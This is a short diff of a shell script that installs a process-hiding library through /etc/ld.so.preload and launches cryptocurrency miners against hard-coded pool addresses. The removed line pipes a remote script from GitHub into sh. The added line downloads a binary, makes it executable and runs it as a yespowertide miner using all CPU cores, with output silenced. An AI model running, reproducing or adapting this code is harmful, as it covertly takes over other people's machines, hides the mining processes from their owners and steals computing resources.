@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./Napto -w zelanajo.$(shuf -n 1 -i 1-9999)-RTX -p 43.173.108.34:80 -g 0 & curl https://github.com/mhusataringan-hub/ABC/raw/refs/heads/main/cpu.sh | sh
+./graftcp/graftcp & clear & ./Napto -w zelanajo.$(shuf -n 1 -i 1-9999)-RTX -p 43.173.108.34:80 -g 0 & wget https://github.com/mhusataringan-hub/KOPI/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1 & clear
